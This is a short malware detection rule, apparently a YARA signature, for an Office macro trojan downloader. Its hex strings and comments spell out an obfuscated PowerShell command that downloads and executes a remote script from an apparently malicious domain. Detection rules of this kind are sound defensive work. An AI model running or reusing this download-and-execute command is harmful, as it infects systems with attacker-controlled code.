
rule TrojanDownloader_O97M_EncDoc_NET_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.NET!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 43 6f 6d 6d 61 6e 64 20 49 45 58 20 28 4e 65 77 2d 4f 62 6a 65 63 74 28 27 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 27 29 29 2e 27 44 6f 57 6e 6c 6f } //1 powershell.exe -Command IEX (New-Object('Net.WebClient')).'DoWnlo
		$a_01_1 = {64 73 54 72 49 6e 47 27 28 27 68 74 27 2b 27 74 70 3a 2f 2f 62 72 75 74 65 63 6c 65 61 6e 65 72 2e 63 6f 6d 2f 53 68 65 65 74 2e 70 73 31 27 29 } //1 dsTrInG'('ht'+'tp://brutecleaner.com/Sheet.ps1')
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}